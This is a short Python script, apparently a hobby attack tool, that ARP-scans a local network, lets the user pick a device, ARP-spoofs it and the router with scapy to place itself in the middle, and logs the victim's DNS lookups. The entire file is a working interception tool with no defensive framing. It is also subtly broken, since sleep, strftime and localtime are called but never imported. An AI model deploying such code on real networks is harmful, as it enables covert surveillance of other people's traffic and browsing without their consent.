#!/usr/bin/env python3
""" Simple MITM """
import argparse
import sys
import threading
from colorama import Fore, Style
from mac_vendor_lookup import MacLookup, VendorNotFoundError
from scapy.layers.dns import DNS
from scapy.layers.l2 import ARP, Ether, arp_mitm
from scapy.sendrecv import sniff, srp

parser = argparse.ArgumentParser(description='DNS Sniffer')
parser.add_argument('--network', help='Network to scan (eg. "10.0.0.0/24").',
                    required=True)
parser.add_argument('--iface', help='Interface use for attack', required=True)
parser.add_argument('--routerip', help='IP of your home router', required=True)

opts = parser.parse_args()


def arp_scan(network, iface):
    """ Function to Scan """
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=5,
                 iface=iface)
    print(f'{Fore.RED}######### NETWORK DEVICES #########{Style.RESET_ALL}\n')
    for i in ans:
        mac = i.answer[ARP].hwsrc
        ip = i.answer[ARP].psrc
        try:
            vendor = MacLookup().lookup(mac)
        except VendorNotFoundError:
            vendor = 'unrecognized device'
        print(f'{Fore.BLUE}{ip}{Style.RESET_ALL} ({mac}, {vendor})')
    return input('\nPick a device IP: ')


class Device:
    def __init__(self, routerip, targetip, iface):
        self.routerip = routerip
        self.targetip = targetip
        self.iface = iface

    def mitm(self):
        while True:
            try:
                arp_mitm(self.routerip, self.targetip, iface=self.iface)
            except OSError:
                print('IP seems down, retrying...')
                sleep(1)
                continue

    def capture(self):
        sniff(iface=self.iface, prn=self.dns,
              filter=f'src host {self.targetip} and udp port 53')

    def dns(self, pkt):
        record = pkt[DNS].qd.qname.decode('utf-8').strip('.')
        time = strftime("%d/%m/%Y %H:%M:%S", localtime())
        print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}{record}{Style.RESET_ALL}]')

    def watch(self):
        t1 = threading.Thread(target=self.mitm, args=())
        t2 = threading.Thread(target=self.capture, args=())

        t1.start()
        t2.start()

if __name__ == '__main__':
    try:
        targetip = arp_scan(opts.network, opts.iface)
        device = Device(opts.routerip, targetip, opts.iface)
        device.watch()
    except KeyboardInterrupt:
        print('Exiting...')
        sys.exit(2)
